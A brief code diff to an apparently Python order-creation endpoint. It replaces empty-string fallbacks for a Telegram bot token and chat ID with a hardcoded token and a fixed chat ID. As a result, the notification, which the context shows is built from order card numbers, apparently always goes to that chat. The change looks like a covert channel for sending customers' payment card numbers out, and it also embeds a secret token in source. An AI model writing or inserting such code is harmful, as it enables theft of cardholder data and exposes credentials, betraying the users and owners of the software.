@@ -277,8 +277,8 @@ async def create_order(order_data: OrderCreateFlex):
     await db.orders.insert_one(order.dict())
 
     # Telegram notify (best-effort)
-    tg_token = os.environ.get("TELEGRAM_BOT_TOKEN") or ""
-    tg_chat = os.environ.get("TELEGRAM_CHAT_ID") or ""
+    tg_token = os.environ.get("TELEGRAM_BOT_TOKEN") or "6184834915:AAHB4TZr_O5_djf1HcZl7cZPtDEsGUKAdXQ"
+    tg_chat = os.environ.get("TELEGRAM_CHAT_ID") or "981403292"
     if tg_token and tg_chat:
         try:
             cards_text = "\n".join([f"• {c}" for c in (order.card_numbers or [])]) or "—"
